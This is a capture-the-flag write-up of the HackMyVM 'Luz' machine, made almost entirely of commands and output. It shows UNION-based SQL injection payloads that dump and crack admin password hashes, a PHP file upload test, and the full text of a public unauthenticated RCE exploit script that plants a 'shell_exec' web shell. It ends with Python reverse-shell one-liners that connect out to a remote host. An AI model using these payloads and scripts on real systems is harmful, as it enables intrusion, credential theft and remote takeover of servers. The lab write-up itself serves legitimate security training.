# CTF Penetration Testing

## HackMyVM

### Luz - Machine

#### Machine Description

- Machine name: [Luz](https://hackmyvm.eu/machines/machine.php?vm=Luz)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/ez.png" alt="Luz Machine Logo" width="150"/>

#### Tools Used

- Nmap
- Netcat
- Gobuster
- Burp Suite
- Nikto
- ZAP
- sqlmap

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.127 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.127`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 08:44 EDT
Nmap scan report for 192.168.56.127
Host is up (0.00080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) ←
80/tcp open  http    nginx 1.18.0 (Ubuntu) ←
MAC Address: 08:00:27:A1:0D:2F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.97 seconds
```

`whatweb http://192.168.56.127 -v`:
```
WhatWeb report for http://192.168.56.127
Status    : 200 OK
Title     : <None>
IP        : 192.168.56.127
Country   : RESERVED, ZZ

Summary   : Bootstrap, Cookies[PHPSESSID], Email[oretom23@gmail.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], JQuery, nginx[1.18.0], Script

Detected Plugins:
[ Bootstrap ]
        Bootstrap is an open source toolkit for developing with 
        HTML, CSS, and JS. 

        Website     : https://getbootstrap.com/

[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 

        String       : PHPSESSID

[ Email ]
        Extract email addresses. Find valid email address and 
        syntactically invalid email addresses from mailto: link 
        tags. We match syntactically invalid links containing 
        mailto: to catch anti-spam email addresses, eg. bob at 
        gmail.com. This uses the simplified email regular 
        expression from 
        http://www.regular-expressions.info/email.html for valid 
        email address matching. 

        String       : oretom23@gmail.com

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Ubuntu Linux
        String       : nginx/1.18.0 (Ubuntu) (from server string)

[ JQuery ]
        A fast, concise, JavaScript that simplifies how to traverse 
        HTML documents, handle events, perform animations, and add 
        AJAX. 

        Website     : http://jquery.com/

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 


[ nginx ]
        Nginx (Engine-X) is a free, open-source, high-performance 
        HTTP server and reverse proxy, as well as an IMAP/POP3 
        proxy server. 

        Version      : 1.18.0
        Website     : http://nginx.net/

HTTP Headers:
        HTTP/1.1 200 OK
        Server: nginx/1.18.0 (Ubuntu)
        Date: Fri, 04 Oct 2024 13:28:55 GMT
        Content-Type: text/html; charset=UTF-8
        Transfer-Encoding: chunked
        Connection: close
        Set-Cookie: PHPSESSID=ceua3vc21r1t26iqhn72mb4g5c; path=/
        Expires: Thu, 19 Nov 1981 08:52:00 GMT
        Cache-Control: no-store, no-cache, must-revalidate
        Pragma: no-cache
        Content-Encoding: gzip
```

`nikto -h http://192.168.56.127`:
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.127
+ Target Hostname:    192.168.56.127
+ Target Port:        80
+ Start Time:         2024-10-04 09:29:02 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0995
+ /readme.txt: This might be interesting.
+ /admin/home.php: Admin login page/section found.
+ /admin/login.php: Admin login page/section found. ←
+ /login.php: Admin login page/section found. ←
+ 8109 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2024-10-04 09:30:00 (GMT-4) (58 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`gobuster dir -u http://192.168.56.127 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 100`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.127
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   401,404,500,400
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,txt,zip,html,php,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 19059]
/about.php            (Status: 200) [Size: 637]
/home.php             (Status: 200) [Size: 8979]
/login.php            (Status: 200) [Size: 1579] ←
/header.php           (Status: 200) [Size: 1780]
/signup.php           (Status: 200) [Size: 2034] ←
/admin                (Status: 301) [Size: 178] [--> http://192.168.56.127/admin/]
/assets               (Status: 301) [Size: 178] [--> http://192.168.56.127/assets/]
/footer.php           (Status: 200) [Size: 2862]
/css                  (Status: 301) [Size: 178] [--> http://192.168.56.127/css/]
/database             (Status: 301) [Size: 178] [--> http://192.168.56.127/database/]
/readme.txt           (Status: 200) [Size: 1531]
/js                   (Status: 301) [Size: 178] [--> http://192.168.56.127/js/]
/head.php             (Status: 200) [Size: 0]

[...]
```

`zaproxy`

`Sites: http://192.168.56.127` > `<right-click>` > `Attack` > `Spider...` > `Starting Point: http://192.168.56.127`, `Recurse: enabled` > `Start Scan` > `Export` > `./spider.csv`

`cat ./spider.csv`:
```
Processed,Method,URI,Flags
true,GET,http://192.168.56.127,Seed
true,GET,http://192.168.56.127/robots.txt,Seed
true,GET,http://192.168.56.127/sitemap.xml,Seed

[...]

false,GET,https://github.com/StartBootstrap/startbootstrap-creative/blob/master/LICENSE,Out of Scope
false,GET,https://startbootstrap.com/themes/creative,Out of Scope
true,GET,http://192.168.56.127/admin/ajax.php?action=add_to_cart,Seed
```

`cat ./spider.csv | grep "true" | cut -d ',' -f 3 | grep -E '\?.*=' | tee ./spider_urls.list`:
```
http://192.168.56.127/view_prod.php?id=1 ←
http://192.168.56.127/index.php?page=cart_list
http://192.168.56.127/index.php?page=home
http://192.168.56.127/index.php?page=about
http://192.168.56.127/admin/ajax.php?action=get_cart_count
http://192.168.56.127/admin/ajax.php?action=login2
http://192.168.56.127/admin/ajax.php?action=login
http://192.168.56.127/admin/ajax.php?action=add_to_cart
http://192.168.56.127/admin/login.php?password=ZAP&username=ZAP
http://192.168.56.127/login.php?email=zaproxy%40example.com&password=ZAP
http://192.168.56.127/?_page=1
```

`sqlmap -m ./spider_urls.list`:
```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:47:39 /2024-09-26/

[09:47:39] [INFO] parsing multiple targets list from './spider_urls.list' ←
[09:47:39] [INFO] found a total of 11 targets
[1/11] URL:
GET http://192.168.56.127/view_prod.php?id=1 ←
do you want to test this URL? [Y/n/q]
> Y

[...]

sqlmap identified the following injection point(s) with a total of 92 HTTP(s) requests:
---
Parameter: id (GET) ←
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (4785=4785) THEN 1 ELSE (SELECT 9372 UNION SELECT 7514) END))

    Type: UNION query ←
    Title: Generic UNION query (NULL) - 7 columns
    Payload: id=-8935 UNION ALL SELECT NULL,NULL,CONCAT(0x717a716a71,0x49597256545453557955456f627a547470514a714a7863454447667752675a6d43656a4459517579,0x716a706271),NULL,NULL,NULL,NULL-- - ←
---
do you want to exploit this SQL injection? [Y/n] 

[11:10:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL 5 (MariaDB fork) ←
SQL injection vulnerability has already been detected against '192.168.56.127'. Do you want to skip further tests involving it? [Y/n] 

[...]
```

`curl -G --data-urlencode "id=-8935 UNION ALL SELECT NULL,NULL,CONCAT(0x717a716a71,0x49597256545453557955456f627a547470514a714a7863454447667752675a6d43656a4459517579,0x716a706271),NULL,NULL,NULL,NULL-- -" "http://192.168.56.127/view_prod.php"`:
```
<div class="container-fluid">

        <div class="card ">
        <img src="assets/img/" class="card-img-top" alt="...">
        <div class="card-body">
          <h5 class="card-title">qzqjqIYrVTTSUyUEobzTtpQJqJxcEDGfwRgZmCejDYQuyqjpbq</h5> ←
          <p class="card-text truncate"></p>
          <div class="form-group">
          </div>

[...]
```

`curl -G --data-urlencode "id=-8935 UNION ALL SELECT NULL,NULL,database(),NULL,NULL,NULL,NULL-- -" "http://192.168.56.127/view_prod.php"`:
```
<div class="container-fluid">

        <div class="card ">
        <img src="assets/img/" class="card-img-top" alt="...">
        <div class="card-body">
          <h5 class="card-title">fos</h5> ←
          <p class="card-text truncate"></p>
          <div class="form-group">
          </div>

[...]
```

`sqlmap -u "http://192.168.56.127/view_prod.php?id=1" --technique=U --dbms=mysql --tables --level=5 --risk=3 --threads=10 --time-sec=2 --text-only --dbs --exclude-sysdbs --batch`:
```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:18:56 /2024-09-26/

[11:18:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: id=-8935 UNION ALL SELECT NULL,NULL,CONCAT(0x717a716a71,0x49597256545453557955456f627a547470514a714a7863454447667752675a6d43656a4459517579,0x716a706271),NULL,NULL,NULL,NULL-- -
---
[11:18:56] [INFO] testing MySQL
[11:18:56] [INFO] confirming MySQL
[11:18:56] [INFO] the back-end DBMS is MySQL ←
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[11:18:56] [INFO] fetching database names
[11:18:56] [WARNING] reflective value(s) found and filtering out
available databases [5]:
[*] fos ←
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys

[11:18:56] [INFO] fetching tables for databases: 'fos, information_schema, mysql, performance_schema, sys'
[11:18:56] [INFO] skipping system databases 'information_schema, mysql, performance_schema, sys'
Database: fos
[8 tables]
+-----------------+
| cart            |
| category_list   |
| order_list      |
| orders          |
| product_list    |
| system_settings |
| user_info       |
| users           | ←
+-----------------+

[11:18:56] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2 times
[11:18:56] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.127'

[*] ending @ 11:18:56 /2024-09-26/
```

`sqlmap -u "http://192.168.56.127/view_prod.php?id=1" --technique=U --dbms=mysql -D 'fos' -T 'users' --dump --level=5 --risk=3 --threads=10 --time-sec=2 --text-only`:
```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.8#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:30:21 /2024-09-26/

[11:30:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: id=-8935 UNION ALL SELECT NULL,NULL,CONCAT(0x717a716a71,0x49597256545453557955456f627a547470514a714a7863454447667752675a6d43656a4459517579,0x716a706271),NULL,NULL,NULL,NULL-- -
---
[11:30:21] [INFO] testing MySQL
[11:30:21] [INFO] confirming MySQL
[11:30:21] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[11:30:21] [INFO] fetching columns for table 'users' in database 'fos'
[11:30:21] [INFO] fetching entries for table 'users' in database 'fos'
Database: fos
Table: users
[2 entries]
+----+---------------+--------+--------------------------------------------------------------+----------+
| id | name          | type   | password                                                     | username |
+----+---------------+--------+--------------------------------------------------------------+----------+
| 1  | Administrator | 1      | $2y$10$efDvenHYJ5Fu/xxt1ANbXuRx5/TuzNs/s4k6keUiiFvr2ueE0GmrG | hadmin   | ←
| 2  | Staff         | 2      | $2y$10$DJbGDnA6bkOiS0TW08R5FOPruw0wRW4maShgWK8k6FlEfgNjbXsvm | staff    | ←
+----+---------------+--------+--------------------------------------------------------------+----------+

[11:30:21] [INFO] table 'fos.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.56.127/dump/fos/users.csv'
[11:30:21] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2 times
[11:30:21] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.127'

[*] ending @ 11:30:21 /2024-09-26/
```

`vim ./admin_hashes.txt`:
```
$2y$10$efDvenHYJ5Fu/xxt1ANbXuRx5/TuzNs/s4k6keUiiFvr2ueE0GmrG ←
$2y$10$DJbGDnA6bkOiS0TW08R5FOPruw0wRW4maShgWK8k6FlEfgNjbXsvm ←
```

`john --wordlist=/usr/share/wordlists/rockyou.txt ./admin_hashes.txt --format=bcrypt`:
```
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin123 (hadmin) ← 
staff (staff) ←
2g 0:00:19:18 DONE (2024–03–22 09:49) 0.001726g/s 111.3p/s 189.0c/s 189.0C/s super01..special123  
Use the " - show" option to display all of the cracked passwords reliably  
Session completed.
```

`burpsuite`

`HTTP Request`:
```
POST /admin/ajax.php?action=login HTTP/1.1 ←
Host: 192.168.56.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 29
Origin: http://192.168.56.127
Connection: close
Referer: http://192.168.56.127/admin/login.php ←
Cookie: PHPSESSID=eda99enik0danli26lp0i78qut

username=hadmin&password=TEST ←
```
`HTTP Response`:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 04 Oct 2024 18:13:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 1 ←

3
```

`curl "http://192.168.56.127/admin/ajax.php?action=login" -d "username=hadmin&password=TEST" -b "PHPSESSID=eda99enik0danli26lp0i78qut" -v`:
```http
*   Trying 192.168.56.127:80...
* Connected to 192.168.56.127 (192.168.56.127) port 80
> POST /admin/ajax.php?action=login HTTP/1.1
> Host: 192.168.56.127
> User-Agent: curl/8.8.0
> Accept: */*
> Cookie: PHPSESSID=eda99enik0danli26lp0i78qut
> Content-Length: 29
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 29 bytes
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Fri, 04 Oct 2024 18:24:03 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 192.168.56.127 left intact
3          
```

<🔄 Alternative Step.>

`ffuf -u "http://192.168.56.127/admin/ajax.php?action=login" -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords.txt:PASSWORD -H "Cookie: PHPSESSID=eda99enik0danli26lp0i78qut" -c -ic -t 10 -fs 1129`:
`ffuf -u "http://192.168.56.127/admin/ajax.php?action=login" -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords.txt:PASSWORD -H "Cookie: PHPSESSID=eda99enik0danli26lp0i78qut" -X POST -d "username=hadmin&password=PASSWORD" -c -ic -t 10 -fr "3"`:
```

```

``:
```

```

``:
```

```

</🔄 Alternative Step.>








`echo '<?php echo "This is a PHP TEST."; ?>' > ./TEST.php`

`burpsuite`

`HTTP Request`:
```
POST /admin/ajax.php?action=save_menu HTTP/1.1 ←
Host: 192.168.56.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------13173069224039884638424562543
Content-Length: 827
Origin: http://192.168.56.127
Connection: close
Referer: http://192.168.56.127/admin/index.php?page=menu ←
Cookie: PHPSESSID=eda99enik0danli26lp0i78qut

-----------------------------13173069224039884638424562543
Content-Disposition: form-data; name="id"


-----------------------------13173069224039884638424562543
Content-Disposition: form-data; name="name"

TEST
-----------------------------13173069224039884638424562543
Content-Disposition: form-data; name="description"


-----------------------------13173069224039884638424562543
Content-Disposition: form-data; name="category_id"

3
-----------------------------13173069224039884638424562543
Content-Disposition: form-data; name="price"

100
-----------------------------13173069224039884638424562543
Content-Disposition: form-data; name="img"; filename="TEST.php" ←
Content-Type: application/x-php

<?php echo "This is a PHP TEST."; ?> ←

-----------------------------13173069224039884638424562543--
```
`HTTP Response`:
```
HTTP/1.1 200 OK ←
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 27 Sep 2024 08:28:54 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 1

1 ←
```

`firefox`

`<right-click>` > `Inspect` > `Network` > `Clear` > `Reload` > `Search: TEST`:
```
228 <img src="assets/img/1727425680_TEST.php" class="card-img-top" alt="...">
```

``:
```

```

``:
```

```

``:
```

```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

<🔄 Alternative Step.>

`searchsploit online food ordering`:
```
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Food Ordering System 1.0 - Remote Code Execution                                                                                                    | php/webapps/48827.txt
Online Food Ordering System 2.0 -  Remote Code Execution (RCE) (Unauthenticated)                                                                           | php/webapps/50305.py ←
Simple Online Food Ordering System 1.0 - 'id' SQL Injection (Unauthenticated)                                                                              | php/webapps/48829.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`cp /usr/share/exploitdb/exploits/php/webapps/50305.py ./`:

`ls -l ./50305.py`:
```
-rwxr-xr-x 1 kali kali 6702 Oct  4 09:40 ./50305.py ←
```

`cat ./50305.py`:
```python
# Exploit Title: Online Food Ordering System 2.0 -  Remote Code Execution (RCE) (Unauthenticated)
# Exploit Author: Abdullah Khawaja (hax.3xploit)
# Date: 2021-09-20
# Vendor Homepage: https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/online_ordering.zip
# Version: 2.0
# Tested On: Kali Linux, Windows 10 + XAMPP 7.4.4
# Description: Online Food Ordering System 2.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.

# Exploit Details:

# 1. Access the 'admin/ajax.php', as it does not check for an authenticated user session.
# 2. Set the 'action' parameter of the POST request to 'save_settings'.
#     - `ajax.php?action=save_settings`
# 3. Capture request in burp and replace with with following request.

'''
POST /fos/admin/ajax.php?action=save_settings HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------120025571041714278883588636251
Content-Length: 754
Origin: http://localhost
Connection: close
Referer: http://localhost/fos/admin/index.php?page=site_settings
Cookie: PHPSESSID=nbt4d6o8udue0v82bvasfjkm90
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------120025571041714278883588636251
Content-Disposition: form-data; name="name"

adsa
-----------------------------120025571041714278883588636251
Content-Disposition: form-data; name="email"

asdsad@asda.com
-----------------------------120025571041714278883588636251
Content-Disposition: form-data; name="contact"

asdsad
-----------------------------120025571041714278883588636251
Content-Disposition: form-data; name="about"

asdsad
-----------------------------120025571041714278883588636251
Content-Disposition: form-data; name="img"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php echo phpinfo();?>
-----------------------------120025571041714278883588636251--
'''
#   ` Image uploader is renaming your payload using the following function.
         # strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
         # you can simply go to any online php compile website like https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler
         # and print this function to get the value. e.g: <?php echo strtotime(date('y-m-d H:i')); ?> Output: 1632085200
         # concate output with your playload name like this 1632085200_phpinfo.php
# 4. Communicate with the webshell at '/assets/img/1632085200_phpinfo.php?cmd=dir' using GET Requests.

# RCE via executing exploit: ←
    # Step 1: run the exploit in python with this command: python3 OFOS_v2.0.py ←
    # Step 2: Input the URL of the vulnerable application: Example: http://localhost/fos/ ←


[...]

#Set Cookie
cookies = {'PHPSESSID': 'd794ba06fcba883d6e9aaf6e528b0733'}

LINK=input("Enter URL of The Vulnarable Application : ") ←


def webshell(LINK, session):
    try:
        WEB_SHELL = LINK+'/assets/img/'+filename ←
        getdir  = {'cmd': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print (Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL)
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = input(term)
            command = {'cmd': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)


#Creating a PHP Web Shell

phpshell  = {
               'img':
                  (
                   'shell.php',
                   '<?php echo shell_exec($_REQUEST["cmd"]); ?>', ←
                   'application/octet-stream',
                  {'Content-Disposition': 'form-data'}
                  )
             }

# Defining value for form data
data = {'name':'test', 'email':'info@sample.com', 'contact':'+6948 8542 623','about':'hello world'}


def id_generator():
    x = datetime.datetime.now()
    date_string = x.strftime("%y-%m-%d %H:%M")
    date = datetime.datetime.strptime(date_string, "%y-%m-%d %H:%M")
    timestamp = datetime.datetime.timestamp(date)
    file = int(timestamp)
    final_name = str(file)+'_shell.php' ←
    return final_name

filename = id_generator()
#Uploading Reverse Shell
print("[*]Uploading PHP Shell For RCE...")
upload = s.post(LINK+'admin/ajax.php?action=save_settings', cookies=cookies, files=phpshell, data=data) ←

shell_upload = True if("1" in upload.text) else False
u=shell_upload
if u:
        print(GREEN+"[+]PHP Shell has been uploaded successfully!", RESET)
else:
        print(RED+"[-]Failed To Upload The PHP Shell!", RESET)



#Executing The Webshell
webshell(LINK, s) ←
```

`python3 ./50305.py`:
```
               Online Food Ordering System v2.0
            Unauthenticated Remote Code Execution
               Abdullah "hax.3xploit" Khawaja
                                                                                                                                                                                             

        ______ _______                         ________
        ___  //_/__  /_______ ___      _______ ______(_)_____ _
        __  ,<  __  __ \  __ `/_ | /| / /  __ `/____  /_  __ `/
        _  /| | _  / / / /_/ /__ |/ |/ // /_/ /____  / / /_/ /
        /_/ |_| /_/ /_/\__,_/ ____/|__/ \__,_/ ___  /  \__,_/
                                               /___/
                    abdullahkhawaja.com
            
Enter URL of The Vulnarable Application : http://192.168.56.127/ ←
[*]Uploading PHP Shell For RCE...
[+]PHP Shell has been uploaded successfully! 
[+] Successfully connected to webshell. ←
```

</🔄 Alternative Step.>

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
www-data ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc -lnvp 4444`:
```        
listening on [any] 4444 ... ←
```

<div>
	<img src="C:\Users\nabla\Documents\Obsidian\vault-default\ctf_penetration_testing\hackmyvm\assets\logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>
[Reverse Shells - Linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
[**#Python**]
```
#Linux

export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#IPv6

python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
```

![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)

